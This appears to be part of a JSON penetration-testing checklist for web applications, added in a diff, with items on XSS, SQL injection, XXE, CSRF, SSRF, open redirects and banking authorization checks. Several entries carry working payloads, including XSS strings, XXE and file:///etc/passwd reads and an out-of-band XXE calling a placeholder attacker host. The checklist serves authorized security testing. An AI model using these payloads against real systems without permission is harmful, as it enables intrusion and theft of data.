+      "activity": "Try base64 payload: 0;data:text/html;base64,PHNjcmlwdD5wcm9tcHQoIlJlZmxlY3RlZCBYU1MgQnkgUHJpYWwiKTwvc2NyaXB0Pg==\"HTTP-EQUIV=\"refresh\"",
+      "tools_technique": ["Manual"],
+      "remarks": ""
+    },
+    {
+      "sr_no": 114,
+      "category": "Cross Site Scripting (XSS)",
+      "activity": "If the logout button just performs the redirection then use old classic XSS payload: javascript:alert(123)",
+      "tools_technique": ["Manual"],
+      "remarks": ""
+    },
+    {
+      "sr_no": 115,
+      "category": "Cross Site Scripting (XSS)",
+      "activity": "Polyglot payload: /*-->]]>%>?></object></script></title></textarea></noscript></style></xmp>'-/\"/-alert(1)//><img src=1 onerror=alert(1)>'",
+      "tools_technique": ["Manual"],
+      "remarks": ""
+    },
+    {
+      "sr_no": 116,
+      "category": "Cross Site Scripting (XSS)",
+      "activity": "Use pure JS payload if input is reflected back in JavaScript: ); alert(document.domain); if (1",
+      "tools_technique": ["Manual"],
+      "remarks": ""
+    },
+    {
+      "sr_no": 117,
+      "category": "Cross Site Scripting (XSS)",
+      "activity": "Locator payload: Test'\" 123' \"Þ}j%Ùÿ '\" \"' ;' '\"();=,%+-/**/ --",
+      "tools_technique": ["Burpsuite"],
+      "remarks": ""
+    },
+    {
+      "sr_no": 118,
+      "category": "SQL Injection",
+      "activity": "If parameter=static_integer_value then: if id=4, try id=3+1 or id=6-2 (if page loads the same way, it is vulnerable)",
+      "tools_technique": ["Burpsuite"],
+      "remarks": ""
+    },
+    {
+      "sr_no": 119,
+      "category": "SQL Injection",
+      "activity": "Use SQLmap to identify vulnerable parameters. Steps: 1. Fill form in browser GUI and submit normally. 2. Go to history tab in Burpsuite and find the relevant request. 3. Right click and select 'copy to file'. 4. Save file as anyname.txt. 5. Run: python sqlmap.py -r ~/Desktop/textsqli.txt --proxy=\"http://127.0.0.1:8080\"",
+      "tools_technique": ["Burpsuite", "SQLmap"],
+      "remarks": "http://oldmanlab.blogspot.in/2012/03/sqlmap-tutorial-you-are-just.html"
+    },
+    {
+      "sr_no": 120,
+      "category": "SQL Injection",
+      "activity": "Search SQL injection syntax error using qsreplace, waybackurls: grep \"=\" .txt | qsreplace \"' OR '1\" | httpx -silent -store-response-dir output -threads 100 | grep -q -rn \"syntax\\|mysql\" output 2>/dev/null",
+      "tools_technique": ["Terminal"],
+      "remarks": ""
+    },
+    {
+      "sr_no": 121,
+      "category": "SQL Injection",
+      "activity": "Database Management System (DBMS) Misconfiguration - Excessively Privileged User / DBA",
+      "tools_technique": ["Manual"],
+      "remarks": ""
+    },
+    {
+      "sr_no": 122,
+      "category": "Open Redirection",
+      "activity": "Open redirect mass testing using oralyzer: python3.8 oralyzer.py -f urls.txt",
+      "tools_technique": ["oralyzer"],
+      "remarks": ""
+    },
+    {
+      "sr_no": 123,
+      "category": "Open Redirection",
+      "activity": "1. Use Burp 'find' option to find parameters such as url, red, redirect, redir, origin, redirect_uri, target etc. 2. Check the value which may contain a URL. 3. Change the URL value to www.chintan.com. 4. Try: https://www.target.com/ÿ/www.twitter.com/, https://www.target.com//www.twitter.com/, https://www.target.com///www.twitter.com/. 5. Bypass filter using returnTo=///chintan.com/",
+      "tools_technique": ["Burpsuite"],
+      "remarks": ""
+    },
+    {
+      "sr_no": 124,
+      "category": "Open Redirection",
+      "activity": "Host header attack: Insert new header X-Forwarded-Host: www.chintan.com in the GET/POST request. Change the Host header to google.com and see if it gets redirected.",
+      "tools_technique": ["Burpsuite"],
+      "remarks": ""
+    },
+    {
+      "sr_no": 125,
+      "category": "Other Testcases",
+      "activity": "SAP Application Testing - SAP Netweaver Application: 1. From the default error page derive the hostname and system information. 2. Do an NMAP scan and check for WebDAV methods on other ports than 80 & 443.",
+      "tools_technique": ["Burpsuite", "Manual"],
+      "remarks": "References: http://www.onapsis.com/slides/ONAPSIS-Penetration_Testing_SAP.pdf, https://www.blackhat.com/presentations/bh-europe-09/DiCroce/BlackHat-Europe-2009-DiCroce-CYBSEC-Publication-SAP-Penetration-Testing-slides.pdf"
+    },
+    {
+      "sr_no": 126,
+      "category": "Other Testcases",
+      "activity": "ASP.NET website testing - Check if ASP.net viewstate parameter is encrypted or not",
+      "tools_technique": ["Burpsuite"],
+      "remarks": ""
+    },
+    {
+      "sr_no": 127,
+      "category": "CSRF Token Testing",
+      "activity": "Re-use Anti-CSRF token for CSRF attack",
+      "tools_technique": ["Burpsuite"],
+      "remarks": ""
+    },
+    {
+      "sr_no": 128,
+      "category": "CSRF Token Testing",
+      "activity": "Check if token is validated on server side or not",
+      "tools_technique": ["Burpsuite"],
+      "remarks": ""
+    },
+    {
+      "sr_no": 129,
+      "category": "CSRF Token Testing",
+      "activity": "Check if token validation is for full length or partial length",
+      "tools_technique": ["Burpsuite"],
+      "remarks": ""
+    },
+    {
+      "sr_no": 130,
+      "category": "CSRF Token Testing",
+      "activity": "Create few dummy accounts and compare the CSRF token for all those accounts",
+      "tools_technique": ["Burpsuite"],
+      "remarks": ""
+    },
+    {
+      "sr_no": 131,
+      "category": "CSRF Token Testing",
+      "activity": "Bypass CSRF token using 2 input type fields for updating user's information in the same HTML file",
+      "tools_technique": ["Burpsuite"],
+      "remarks": ""
+    },
+    {
+      "sr_no": 132,
+      "category": "CSRF Token Testing",
+      "activity": "Convert POST request to GET and remove _csrf (anti-csrf token) to bypass the CSRF protection",
+      "tools_technique": ["Burpsuite"],
+      "remarks": ""
+    },
+    {
+      "sr_no": 133,
+      "category": "CSRF Token Testing",
+      "activity": "Check if the value you are trying to change is passed in multiple parameters such as cookie, http headers along with GET and POST request",
+      "tools_technique": ["Manual"],
+      "remarks": ""
+    },
+    {
+      "sr_no": 134,
+      "category": "CSRF Token Testing",
+      "activity": "XML Injection Testing (XXE). Insert code to retrieve /etc/passwd contents. Change content type to text/xml then insert payload: <?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE chintan [<!ELEMENT chintan ANY><!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><chintan>&xxe;</chintan>",
+      "tools_technique": ["Burpsuite Repeater"],
+      "remarks": "Instance 2 - XXE in VisualRF Backup Sites (CVE-2016-8526): POST /visualrf/backup_sites with xml=<?xml version=\"1.0\" encoding=\"UTF-8\" ?><!DOCTYPE x [<!ENTITY %25 foo SYSTEM \"http://<AttackerHost>:1234/sectest.dtd\">%25%66%6f%6f%3b%25%70%61%72%61%6d%31%3b]>"
+    },
+    {
+      "sr_no": 135,
+      "category": "CSRF Token Testing",
+      "activity": "OTP testing: 1. Check for OTP bypass. 2. Check for OTP reuse. 3. Check for increasing OTP validity via parameter tampering.",
+      "tools_technique": ["Burpsuite"],
+      "remarks": ""
+    },
+    {
+      "sr_no": 136,
+      "category": "Banking Application Auditing",
+      "activity": "Billing Activity Testing: 1. Check if user A can view account statement for user B. 2. Check if user A can view transaction report for user B. 3. Check if user A can view summary report for user B. 4. Check if user A can register for monthly/weekly account statement via email on behalf of user B. 5. Check if user A can update existing email id of user B to retrieve monthly/weekly account summary.",
+      "tools_technique": ["Burpsuite"],
+      "remarks": ""
+    },
+    {
+      "sr_no": 137,
+      "category": "Banking Application Auditing",
+      "activity": "Deposit/Loan/Linked/External Account Checking: 1. Check if user A can view deposit account summary of user B. 2. Check for account balance tampering for Deposit accounts.",
+      "tools_technique": ["Burpsuite"],
+      "remarks": ""
+    },
+    {
+      "sr_no": 138,
+      "category": "Banking Application Auditing",
+      "activity": "Tax Deduction Inquiry Testing: 1. Check if user A with customer id 'a' can see tax deduction details of user B by tampering customer id 'b'. 2. Check parameter tampering for increasing and decreasing interest rate, interest amount, and tax refund. 3. Check if user A can download the TDS details of user B.",
+      "tools_technique": ["Burpsuite"],
+      "remarks": ""
+    },
+    {
+      "sr_no": 139,
+      "category": "Banking Application Auditing",
+      "activity": "Check if user A can request for the cheque book on behalf of user B",
+      "tools_technique": ["Burpsuite"],
+      "remarks": ""
+    },
+    {
+      "sr_no": 140,
+      "category": "Banking Application Auditing",
+      "activity": "Fixed Deposit Account Testing: 1. Check if it is possible for user A to open FD account on behalf of user B. 2. Check if user can open FD account with more amount than the current account balance.",
+      "tools_technique": ["Burpsuite"],
+      "remarks": ""
+    },
+    {
+      "sr_no": 141,
+      "category": "Banking Application Auditing",
+      "activity": "Stopping Payment on basis of cheque/date range: 1. Can user A stop the payment of user B via cheque number. 2. Can user A stop the payment on basis of date range for user B.",
+      "tools_technique": ["Burpsuite"],
+      "remarks": ""
+    },
+    {
+      "sr_no": 142,
+      "category": "Banking Application Auditing",
+      "activity": "Status Enquiry Testing: 1. Can user A view the status enquiry of user B. 2. Can user A modify the status enquiry of user B. 3. Can user A post an enquiry on behalf of user B from his own account.",
+      "tools_technique": ["Burpsuite"],
+      "remarks": ""
+    },
+    {
+      "sr_no": 143,
+      "category": "Banking Application Auditing",
+      "activity": "Fund transfer testing: 1. Is it possible to transfer funds to user C instead of user B from user A. 2. Can fund transfer amount be manipulated. 3. Can user A modify the payee list of user B by parameter manipulation. 4. Is it possible to add payee without any proper validation.",
+      "tools_technique": ["Burpsuite"],
+      "remarks": ""
+    },
+    {
+      "sr_no": 144,
+      "category": "Banking Application Auditing",
+      "activity": "Schedule transfer testing: 1. Can user A view the schedule transfer of user B. 2. Can user A change the details of schedule transfer for user B.",
+      "tools_technique": ["Burpsuite"],
+      "remarks": ""
+    },
+    {
+      "sr_no": 145,
+      "category": "Banking Application Auditing",
+      "activity": "Testing of fund transfer via NEFT: 1. Amount manipulation via NEFT transfer. 2. Check if user A can view the NEFT transfer details of user B.",
+      "tools_technique": ["Burpsuite"],
+      "remarks": ""
+    },
+    {
+      "sr_no": 146,
+      "category": "Banking Application Auditing",
+      "activity": "Testing for Bill Payment: 1. Check if user can register payee without any checker approval. 2. Check if user A can view the pending payments of user B. 3. Check if user A can view the payment made details of user B.",
+      "tools_technique": ["Burpsuite"],
+      "remarks": ""
+    },
+    {
+      "sr_no": 147,
+      "category": "Web Services Testing",
+      "activity": "SOAP message tampering: 1. Bruteforcing using *. 2. Bruteforcing using user credentials. 3. Parameter guessing.",
+      "tools_technique": ["Burpsuite"],
+      "remarks": ""
+    },
+    {
+      "sr_no": 148,
+      "category": "Web Services Testing",
+      "activity": "Convert GET to POST and POST to GET methods",
+      "tools_technique": ["Burpsuite"],
+      "remarks": ""
+    },
+    {
+      "sr_no": 149,
+      "category": "Web Services Testing",
+      "activity": "SQL Injection: ' \" - * )",
+      "tools_technique": ["Burpsuite"],
+      "remarks": ""
+    },
+    {
+      "sr_no": 150,
+      "category": "Web Services Testing",
+      "activity": "Directory traversal: ../../../../../autoexec.bat",
+      "tools_technique": ["Burpsuite"],
+      "remarks": ""
+    },
+    {
+      "sr_no": 151,
+      "category": "Web Services Testing",
+      "activity": "XML Poisoning",
+      "tools_technique": ["Burpsuite"],
+      "remarks": ""
+    },
+    {
+      "sr_no": 152,
+      "category": "Web Services Testing",
+      "activity": "Enumeration and profiling: 1. <service> - Web service. 2. <operation> - Web methods. 3. <element> - Data types. 4. <endpoint> - Web service address.",
+      "tools_technique": ["Burpsuite"],
+      "remarks": ""
+    },
+    {
+      "sr_no": 153,
+      "category": "Web Services Testing",
+      "activity": "Automated Scanners - Use automated scanners one by one against the application",
+      "tools_technique": ["Burpsuite", "Netsparker"],
+      "remarks": ""
+    },
+    {
+      "sr_no": 154,
+      "category": "CAPTCHA Testing",
+      "activity": "Replay attack: 1. Send old captcha value - if accepts then it is vulnerable. 2. Send old captcha value with old session ID - if it accepts then it is vulnerable.",
+      "tools_technique": ["Burpsuite"],
+      "remarks": ""
+    },
+    {
+      "sr_no": 155,
+      "category": "CAPTCHA Testing",
+      "activity": "Check if captcha is retrievable with the absolute path such as www.chintan.com/internal/captcha/images/24.png",
+      "tools_technique": ["Manual"],
+      "remarks": "If so, attacker can download all images and know their individual values, then write a small program to bruteforce it."
+    },
+    {
+      "sr_no": 156,
+      "category": "CAPTCHA Testing",
+      "activity": "Check for the server side validation for CAPTCHA: Remove captcha block from GUI using firebug addon and submit request to the server.",
+      "tools_technique": ["Firebug addon"],
+      "remarks": ""
+    },
+    {
+      "sr_no": 157,
+      "category": "CAPTCHA Testing",
+      "activity": "Check if image recognition can be done with OCR tool. a. If OCR identifies then report as weak strength of captcha. b. If no, then secure.",
+      "tools_technique": ["OCR (Optical Character Recognition)", "http://www.free-ocr.com/"],
+      "remarks": ""
+    },
+    {
+      "sr_no": 158,
+      "category": "Other Testcases",
+      "activity": "Check for SSRF Vulnerability by giving www.chintan.com:22, www.chintan.com:23 etc. Check for the response page and determine if the port is opened.",
+      "tools_technique": ["Manual"],
+      "remarks": ""
+    },
+    {
+      "sr_no": 159,
+      "category": "Other Testcases",
+      "activity": "Check for: Clickjacking on Sensitive Action, X-XSS header, HSTS header, CSP header, Referrer-Policy, Cache Control, Public key pins, X-Webkit-CSP",
+      "tools_technique": ["Manual"],
+      "remarks": ""
+    },
+    {
+      "sr_no": 160,
+      "category": "Other Testcases",
+      "activity": "Command injection through CSV export: 1. Export the list of registered users or group members. 2. Write =2*10 in first name, last name etc. 3. Export the CSV and check if command executed successfully. 4. If result shows 20 in first name, you can spread malware through CSV.",
+      "tools_technique": ["Manual"],
+      "remarks": "An attacker can inject commands (e.g. =2*10) in fields, and when exported to CSV it evaluates to 20, enabling malware spread and system level commands on victim's machine if victim downloads the CSV."
+    },
+    {
+      "sr_no": 161,
+      "category": "Other Testcases",
+      "activity": "DDOS using xmlrpc.php",
+      "tools_technique": ["Burpsuite Repeater"],
+      "remarks": "Wordpress blogs with xmlrpc.php enabled for pingbacks/trackbacks can be used as part of a botnet for DDOS. To check if xmlrpc.php is enabled, send: POST /xmlrpc.php HTTP/1.1 with methodCall demo.sayHello."
+    },
+    {
+      "sr_no": 162,
+      "category": "Other Testcases",
+      "activity": "If website has a feature for importing contacts from .CSV files: 1. Add one contact with name \"><script>alert(\"chintan\")</script>. 2. Import contact to the website. 3. Check if script is executed or not.",
+      "tools_technique": ["Manual"],
+      "remarks": ""
+    },
+    {
+      "sr_no": 163,
+      "category": "Other Testcases",
+      "activity": "CSV Excel Macro Injection",
+      "tools_technique": ["Manual"],
+      "remarks": "References: https://hackerone.com/reports/90131, https://www.owasp.org/index.php/CSV_Excel_Macro_Injection"
+    },
+    {
+      "sr_no": 164,
+      "category": "Other Testcases",
+      "activity": "Find metadata for the downloadable objects",
+      "tools_technique": ["Burpsuite metadata extender"],
+      "remarks": ""
+    },
+    {
+      "sr_no": 165,
+      "category": "Other Testcases",
+      "activity": "Review Image files, PDF files and other object's metadata for information leakage",
+      "tools_technique": ["Burpsuite plugin for Metadata"],
+      "remarks": ""
+    },
+    {
+      "sr_no": 166,
+      "category": "Other Testcases",
+      "activity": "Test Rich Internet Application (RIA) cross domain policy: 1. Try to access crossdomain.xml. 2. Try to access clientaccesspolicy.xml.",
+      "tools_technique": ["Manual", "Nikto", "W3af"],
+      "remarks": ""
+    },
+    {
+      "sr_no": 167,
+      "category": "Other Testcases",
+      "activity": "Testing for Role authorization: 1. Check if normal user can access the resources of high privileged users. 2. Forced browsing. 3. Insecure direct object reference. 4. Parameter tampering to switch user account to high privileged user.",
+      "tools_technique": ["Manual", "Burpsuite"],
+      "remarks": ""
+    },
+    {
+      "sr_no": 168,
+      "category": "Other Testcases",
+      "activity": "No rate limiting on form: Registration, Login, Email triggering, SMS triggering",
+      "tools_technique": ["Manual", "Burpsuite Intruder"],
+      "remarks": ""
+    },
+    {
+      "sr_no": 169,
+      "category": "Other Testcases",
+      "activity": "Test for OTP: 1. Try injection to bypass OTP verification. 2. Check for guessable OTP codes. 3. Check for the response in order to bypass OTP. 4. Give ' in OTP and check if you can bypass it. Additional Scenario: While signing up, the OTP is sent to the mobile number - intercept the request and edit the mobile number with an already registered number to login as another user.",
+      "tools_technique": ["Manual", "Burpsuite"],
+      "remarks": ""
+    },
+    {
+      "sr_no": 170,
+      "category": "Other Testcases",
+      "activity": "If you find phpinfo.php file, check for the configuration leakage and try to exploit any network vulnerability",
+      "tools_technique": ["Manual"],
+      "remarks": "Reference: https://medium.com/bugbountywriteup/from-security-misconfiguration-to-gaining-access-of-smtp-server-ed833e757e6e"
+    },
+    {
+      "sr_no": 171,
+      "category": "Other Testcases",
+      "activity": "Bypass SAML authentication by response tampering",
+      "tools_technique": ["SAML Decoder - https://www.samltool.com/decode.php"],
+      "remarks": ""
+    },
+    {
+      "sr_no": 172,
+      "category": "Other Testcases",
+      "activity": "If CSP header blocks the clickjacking attack and origin parameter is present in the original request, bypass by adding unicode characters in the value of origin header.",
+      "tools_technique": ["Manual"],
+      "remarks": "Example: https://myaccount.google.com/u/0/brandaccounts/group/{your-groupid}/managers?originProduct=AC&origin=https://%0d.business.google.com. Reference: https://apapedulimu.click/clickjacking-on-google-myaccount-worth-7500/"
+    },
+    {
+      "sr_no": 173,
+      "category": "Other Testcases",
+      "activity": "Use PATCH HTTP header to find information disclosure",
+      "tools_technique": ["Manual"],
+      "remarks": ""
+    },
+    {
+      "sr_no": 174,
+      "category": "Other Testcases",
+      "activity": "Check whether the application uses any ipAddress parameter or not. If yes, decimal IP address can be converted into real IP for information disclosure.",
+      "tools_technique": ["https://www.smartconversion.com/unit_conversion/IP_Address_Converter.aspx"],
+      "remarks": "Reference: https://medium.com/bugbountywriteup/how-i-earned-5040-from-twitter-by-showing-a-way-to-harvest-other-users-ip-addresse9f43c931e9a"
+    },
+    {
+      "sr_no": 175,
+      "category": "Other Testcases",
+      "activity": "Imagemagick GIF coder vulnerability leads to memory disclosure",
+      "tools_technique": ["https://github.com/neex"],
+      "remarks": "Reference: https://medium.com/@kunal94/imagemagick-gif-coder-vulnerability-leads-to-memory-disclosure-hackerone-e9975a6a560e"
+    },
+    {
+      "sr_no": 176,
+      "category": "Other Testcases",
+      "activity": "If the GIT repository file is found on the server, try to download the entire source code of the website using git-dumper tool: python3 git-dumper.py $name /root/Desktop/tools/web/git-dumper/output",
+      "tools_technique": ["git-dumper - https://github.com/arthaud/git-dumper"],
+      "remarks": ""
+    },
+    {
+      "sr_no": 177,
+      "category": "Other Testcases",
+      "activity": "Check for the Unsubscribe button: 1. Subscribe to email id. 2. Unsubscribe and check whether the website confirms first or sends any notification to a user or not. a. If yes - Not vulnerable. b. If no - Vulnerable (affects availability). If a website has username enumeration issue then it becomes High-Medium level issue.",
+      "tools_technique": ["Manual"],
+      "remarks": ""
+    },
+    {
+      "sr_no": 178,
+      "category": "Other Testcases",
+      "activity": "Check whether the application allows downloading Excel file. If yes, download the file, unzip it. Add your custom XXE payload /etc/passwd and upload on the server.",
+      "tools_technique": ["Manual"],
+      "remarks": "XXE in bol.com"
+    },
+    {
+      "sr_no": 179,
+      "category": "Other Testcases",
+      "activity": "If the server is IIS 7 then test for: IIS Short Name scanner, HTTP.sys DOS RCE",
+      "tools_technique": ["Manual"],
+      "remarks": ""
+    },
+    {
+      "sr_no": 180,
+      "category": "Other Testcases",
+      "activity": "Inspect all JS files, you might get lucky",
+      "tools_technique": ["Manual"],
+      "remarks": ""
+    },
+    {
+      "sr_no": 181,
+      "category": "Other Testcases",
+      "activity": "Executable download - No secure integrity check",
+      "tools_technique": ["BurpSuite"],
+      "remarks": ""
+    },
+    {
+      "sr_no": 182,
+      "category": "Other Testcases",
+      "activity": "Directory listing - Non sensitive data exposure",
+      "tools_technique": ["Burpsuite", "Manual"],
+      "remarks": ""
+    },
+    {
+      "sr_no": 183,
+      "category": "Other Testcases",
+      "activity": "Potentially unsafe HTTP method enabled: OPTIONS, PUT, DELETE",
+      "tools_technique": ["Burpsuite", "Manual"],
+      "remarks": ""
+    },
+    {
+      "sr_no": 184,
+      "category": "Other Testcases",
+      "activity": "Reflected file download",
+      "tools_technique": ["Manual"],
+      "remarks": ""
+    },
+    {
+      "sr_no": 185,
+      "category": "Other Testcases",
+      "activity": "Parameter Pollution - Social Media Sharing Buttons",
+      "tools_technique": ["Manual"],
+      "remarks": ""
+    },
+    {
+      "sr_no": 186,
+      "category": "Other Testcases",
+      "activity": "Full path disclosure",
+      "tools_technique": ["Manual"],
+      "remarks": ""
+    },
+    {
+      "sr_no": 187,
+      "category": "Other Testcases",
+      "activity": "Internal IP disclosure",
+      "tools_technique": ["Manual"],
+      "remarks": ""
+    },
+    {
+      "sr_no": 188,
+      "category": "Other Testcases",
+      "activity": "Outdated software versions",
+      "tools_technique": ["Manual"],
+      "remarks": ""
+    },
+    {
+      "sr_no": 189,
+      "category": "Other Testcases",
+      "activity": "Sensitive application data stored unencrypted - Internal storage",
+      "tools_technique": ["Manual"],
+      "remarks": ""
+    },
+    {
+      "sr_no": 190,
+      "category": "Other Testcases",
+      "activity": "Unsafe Cross-Origin-Resource Sharing",
+      "tools_technique": ["Manual"],
+      "remarks": ""
+    },
+    {
+      "sr_no": 191,
+      "category": "Other Testcases",
+      "activity": "Wordpress testing: enumerate vulnerable plugins, enumerate vulnerable themes, enumerate email addresses and usernames, bruteforce using custom wordlist",
+      "tools_technique": ["Manual"],
+      "remarks": ""
+    },
+    {
+      "sr_no": 192,
+      "category": "Other Testcases",
+      "activity": "Use searchsploit to find custom exploits",
+      "tools_technique": ["Manual"],
+      "remarks": ""
+    },
+    {
+      "sr_no": 193,
+      "category": "Other Testcases",
+      "activity": "Use metasploit to find custom exploits. Use metasploit --check option to check whether target is exploitable or not. Remember to give targetURI for the successful exploitation.",
+      "tools_technique": ["Metasploit"],
+      "remarks": ""
+    },
+    {
+      "sr_no": 194,
+      "category": "Other Testcases",
+      "activity": "Find secrets using Burp Extension. Keywords: access_key, access_token, accessKey, accessToken, account_sid, accountsid",
+      "tools_technique": ["BurpSuite-Xkeys - https://github.com/vsec7/BurpSuite-Xkeys"],
+      "remarks": ""
+    },
+    {
+      "sr_no": 195,
+      "category": "Other Testcases",
+      "activity": "Use GF patterns to identify potential input points. Take patterns and search through application.",
+      "tools_technique": ["Gf-Patterns - https://github.com/1ndianl33t/Gf-Patterns/"],
+      "remarks": ""
+    },
+    {
+      "sr_no": 196,
+      "category": "Other Testcases",
+      "activity": "Jaeles Scan - Jaeles Signature Scan: cat list_target.txt | jaeles scan -c 100 -s <signature>",
+      "tools_technique": ["Jaeles"],
+      "remarks": ""
+    },
+    {
+      "sr_no": 197,
+      "category": "Other Testcases",
+      "activity": "Making Favicon.ico based Recon",
+      "tools_technique": ["FavFreak - https://github.com/devanshbatham/FavFreak"],
+      "remarks": ""
+    },
+    {
+      "sr_no": 198,
+      "category": "Other Testcases",
+      "activity": "Find secrets on Github",
+      "tools_technique": ["gitGraber - https://github.com/hisxo/gitGraber"],
+      "remarks": ""
+    },
+    {
+      "sr_no": 199,
+      "category": "Other Testcases",
+      "activity": "HTTP parameter discovery suite",
+      "tools_technique": ["Arjun - https://github.com/s0md3v/Arjun"],
+      "remarks": ""
+    },
+    {
+      "sr_no": 200,
+      "category": "Other Testcases",
+      "activity": "Broken Link Hijacking: Manually find and click external links on the target site. Also run broken-link-checker in background: blc -rof --filter-level 3 https://example.com/. If output shows BROKEN links, check if company has the page or not. If not, register as the company or try to get that username or URL.",
+      "tools_technique": ["blc (broken-link-checker)", "Manual"],
+      "remarks": "Example output: BROKEN https://www.linkedin.com/company/ACME-inc-/ (HTTP_999)"
+    },
+    {
+      "sr_no": 201,
+      "category": "Other Testcases",
+      "activity": "Web Hacker's Weapons - A collection of cool tools used by Web hackers",
+      "tools_technique": ["https://github.com/hahwul?tab=repositories"],
+      "remarks": ""
+    },
+    {
+      "sr_no": 202,
+      "category": "Other Testcases",
+      "activity": "The Bug Hunter's Methodology (TBHM) - Manual hunt",
+      "tools_technique": ["https://github.com/jhaddix/"],
+      "remarks": ""
+    },
+    {
+      "sr_no": 203,
+      "category": "Other Testcases",
+      "activity": "SSRF/LFI: Search for URL or Download parameter. Try file:///etc/passwd. url=file:///etc/passwd. download=file:///etc/passwd.",
+      "tools_technique": ["Manual"],
+      "remarks": ""
+    }
+  ]
+}
